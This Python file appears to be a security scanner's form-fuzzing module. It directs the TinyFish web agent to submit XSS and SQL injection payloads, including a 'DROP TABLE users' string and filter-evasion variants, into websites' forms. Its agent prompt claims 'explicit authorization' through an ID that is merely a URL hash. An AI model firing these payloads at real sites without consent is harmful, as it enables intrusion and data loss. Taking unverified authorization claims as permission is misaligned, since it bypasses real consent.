"""
Form Fuzzer Agent — powered by TinyFish Web Agent API.
Submits forms with XSS and SQLi fuzzing payloads.
Now scope-aware: requires explicit authorization before active testing.
Includes payload randomization and submission logging.
"""

import os
import json
import random
import hashlib
from datetime import datetime
from tinyfish import TinyFish
from dotenv import load_dotenv

load_dotenv()

FUZZ_LOG_FILE = "fuzz_submissions.json"
xss_findings = []
sqli_findings = []

# Base payloads with randomization markers
XSS_PAYLOADS_BASE = [
    '<script>alert("XSS")</script>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "<svg/onload=confirm(1)>",
    "'-alert(1)-'",
]

SQLI_PAYLOADS_BASE = [
    "' OR '1'='1",
    "' OR 1=1--",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "admin'--",
]

# Evasion-aware payload variants
XSS_EVASIONS = [
    "<{tag} {attr}={value}>",
    "\"'><{tag} {attr}={value}>",
    "</textarea><{tag} {attr}={value}>",
]

SQLI_EVASIONS = [
    "' OR {num}={num}--",
    "'/**/OR/**/{num}={num}--",
    "') OR ({num}={num})--",
]


def _randomize_payloads(authorized: bool) -> tuple[list[str], list[str]]:
    """
    Generate randomized payloads with unique markers for tracking.
    If not authorized, returns safe probe payloads instead.
    """
    if not authorized:
        # Non-invasive probe payloads only
        return (
            [f"__scoutai_probe_{random.randint(10000,99999)}__"],
            [f"scoutai_sqli_probe_{random.randint(10000,99999)}"],
        )

    scan_id = hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:8]

    xss_payloads = []
    for base in random.sample(XSS_PAYLOADS_BASE, min(3, len(XSS_PAYLOADS_BASE))):
        xss_payloads.append(f"{base}<!--{scan_id}-->")

    # Add evasion variants
    tags = ["img", "svg", "body"]
    attrs_vals = [("onerror", "alert(1)"), ("onload", "confirm(1)")]
    for _ in range(2):
        tag = random.choice(tags)
        attr, val = random.choice(attrs_vals)
        tmpl = random.choice(XSS_EVASIONS)
        payload = tmpl.format(tag=tag, attr=attr, value=val)
        xss_payloads.append(f"{payload}<!--{scan_id}-->")

    sqli_payloads = []
    for base in random.sample(SQLI_PAYLOADS_BASE, min(3, len(SQLI_PAYLOADS_BASE))):
        sqli_payloads.append(f"{base} /*{scan_id}*/")

    for _ in range(2):
        num = random.randint(1000, 9999)
        tmpl = random.choice(SQLI_EVASIONS)
        sqli_payloads.append(f"{tmpl.format(num=num)} /*{scan_id}*/")

    return xss_payloads, sqli_payloads


def _log_submission(entry: dict):
    """Log every form submission attempt."""
    log = []
    if os.path.exists(FUZZ_LOG_FILE):
        try:
            with open(FUZZ_LOG_FILE) as f:
                log = json.load(f)
        except (json.JSONDecodeError, IOError):
            pass

    entry["timestamp"] = datetime.now().isoformat()
    log.append(entry)

    if len(log) > 1000:
        log = log[-1000:]

    with open(FUZZ_LOG_FILE, "w") as f:
        json.dump(log, f, indent=2, default=str)


def fuzz_forms(crawl_data: dict, authorized: bool = False, progress_callback=None) -> dict:
    """
    For each form discovered, instruct TinyFish to fuzz with payloads.
    Requires explicit authorization for active testing.
    Every submission is logged.
    """
    def emit(msg, sub=""):
        if progress_callback:
            progress_callback("fuzz", msg, sub)

    url = crawl_data.get("url", "")
    forms = crawl_data.get("forms", [])

    result = {
        "forms_tested": 0,
        "xss_findings": [],
        "sqli_findings": [],
        "errors": [],
        "authorized": authorized,
        "submissions_logged": 0,
    }

    if not forms:
        emit("No forms found to fuzz — skipping form fuzzing")
        return result

    if not authorized:
        emit(f"⚠️ Found {len(forms)} form(s) but fuzzing NOT authorized — running safe probes only")
        result["errors"].append("Form fuzzing skipped: active testing not authorized by user")
        return result

    xss_payloads, sqli_payloads = _randomize_payloads(authorized)

    client = TinyFish(api_key=os.getenv("TINYFISH_API_KEY"))
    emit(f"Found {len(forms)} form(s) — starting authorized payload fuzzing", url)

    for i, form in enumerate(forms[:5]):  # extended to 5 forms
        action = form.get("action", url)
        method = form.get("method", "POST").upper()
        inputs = form.get("inputs", form.get("fields", []))

        emit(f"Fuzzing form {i+1}/{min(len(forms), 5)}: {action} [{method}]", str(inputs))

        for payload_type, payloads in [("XSS", xss_payloads), ("SQLi", sqli_payloads)]:
            for payload in payloads[:3]:
                goal = f"""
You are a security tester with explicit authorization to perform form fuzzing.

Authorization ID: SCOUTAI-FUZZ-{hashlib.md5(url.encode()).hexdigest()[:8]}

Navigate to: {url}
Find the form with action "{action}" (method: {method}).
Fill ALL text input fields with this exact payload: {payload}
Submit the form.
Observe the response carefully:
- Does the payload appear reflected in the response HTML? (XSS indicator)
- Are there database error messages? (SQLi indicator)
- Is there any unusual error or behavior?

Report your findings as JSON:
{{
  "payload": "{payload}",
  "payload_type": "{payload_type}",
  "form_action": "{action}",
  "reflected": true/false,
  "error_message_found": true/false,
  "response_snippet": "first 500 chars of response...",
  "vulnerable": true/false,
  "notes": "explanation"
}}
"""
                try:
                    import signal as _signal
                    def _fuzz_timeout(s, f): raise TimeoutError("Fuzz timed out")
                    _signal.signal(_signal.SIGALRM, _fuzz_timeout)
                    _signal.alarm(120)

                    fuzz_result = {"payload": payload, "payload_type": payload_type, "form_action": action}

                    with client.agent.stream(url=url, goal=goal) as stream:
                        for event in stream:
                            etype = event.get("type", "")

                            if etype == "STREAMING_URL":
                                stream_url = event.get("streamingUrl")
                                if progress_callback:
                                    progress_callback("STREAMING_URL", f"Live browser: {stream_url}")

                            elif etype == "PROGRESS":
                                purpose = event.get("purpose", "")
                                if purpose:
                                    emit(f"[{payload_type}] {purpose}", action)

                            elif etype == "COMPLETE" and event.get("status") == "COMPLETED":
                                raw = event.get("resultJson", {})
                                fuzz_result.update(raw)

                                # Log every submission
                                _log_submission({
                                    "url": url,
                                    "form_action": action,
                                    "method": method,
                                    "payload": payload,
                                    "payload_type": payload_type,
                                    "vulnerable": raw.get("vulnerable", False),
                                    "reflected": raw.get("reflected", False),
                                })
                                result["submissions_logged"] += 1

                                if raw.get("vulnerable"):
                                    finding = {
                                        "form_action": action,
                                        "payload": payload,
                                        "payload_type": payload_type,
                                        "response_snippet": raw.get("response_snippet", ""),
                                        "notes": raw.get("notes", ""),
                                    }
                                    if payload_type == "XSS":
                                        result["xss_findings"].append(finding)
                                        emit(f"⚠️ Potential XSS found in form: {action}", payload[:80])
                                    else:
                                        result["sqli_findings"].append(finding)
                                        emit(f"⚠️ Potential SQLi found in form: {action}", payload[:80])
                                else:
                                    emit(f"[{payload_type}] No reflection detected", payload[:60])

                except (Exception, TimeoutError) as e:
                    result["errors"].append(str(e))
                    emit(f"Skipping form (timeout/error): {e}", action)
                finally:
                    _signal.alarm(0)

        result["forms_tested"] += 1

    total = len(result["xss_findings"]) + len(result["sqli_findings"])
    emit(f"Form fuzzing complete — {result['forms_tested']} forms tested, {total} potential findings, {result['submissions_logged']} submissions logged", "")
    return result